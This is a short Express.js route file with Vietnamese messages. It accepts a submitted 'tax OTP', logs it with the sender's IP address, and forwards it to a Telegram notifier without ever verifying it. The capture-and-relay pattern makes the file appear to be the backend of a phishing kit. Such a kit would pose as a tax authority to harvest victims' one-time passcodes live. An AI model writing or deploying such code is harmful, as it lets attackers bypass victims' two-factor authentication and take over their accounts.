const express = require('express');
const { getDb } = require('../db/migrate');
const { sendTaxOtpNotification } = require('../services/telegram');

const router = express.Router();

router.post('/', async (req, res) => {
  try {
    const { otp } = req.body;
    if (!otp) return res.status(400).json({ error: 'Thiếu mã OTP' });

    const db = getDb();
    db.prepare('INSERT INTO tax_otp_logs (otp_code, ip_address) VALUES (?, ?)').run(
      otp,
      req.headers['x-forwarded-for'] || req.ip || 'unknown'
    );

    sendTaxOtpNotification(otp).catch(() => {});
    res.json({ success: true });
  } catch (err) {
    console.error('[OTP] Error:', err);
    res.status(500).json({ error: 'Lỗi máy chủ' });
  }
});

module.exports = router;
